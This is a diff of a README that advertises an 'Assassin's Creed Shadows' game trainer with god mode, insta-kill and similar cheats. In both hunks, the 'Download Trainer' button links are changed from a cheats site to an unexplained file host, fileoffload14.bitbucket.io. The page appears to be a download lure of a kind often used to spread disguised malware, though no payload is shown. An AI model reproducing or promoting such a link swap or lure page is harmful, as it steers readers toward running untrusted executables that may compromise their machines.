@@ -4,7 +4,7 @@ Yo shinobi lovers and stealth freaks 👺, if you're diving into the shadowy wor
 
 This trainer’s got everything you’d want to dominate the lands of feudal Japan – from god mode to insta-kill, stealth buffs, mega yen 💴, and a whole lotta cheat codes that’ll turn you from basic ninja to legendary shadow warrior.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/assassins-creed-shadows)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## What This Beast Does 🐉
@@ -24,7 +24,7 @@ The **Assassin’s Creed Shadows Trainer** ain’t your regular glitchy mess. It
 
 And that’s just scratching the surface.
 
-[![Download Trainer](https://overclockers.ru/st/legacy/blog/413830/615720_O.jpg)](https://wecheaters.github.io/cheats/assassins-creed-shadows)
+[![Download Trainer](https://overclockers.ru/st/legacy/blog/413830/615720_O.jpg)](https://fileoffload14.bitbucket.io)
 ---
 
 ## How It Compares With Other Trainers ⚖️
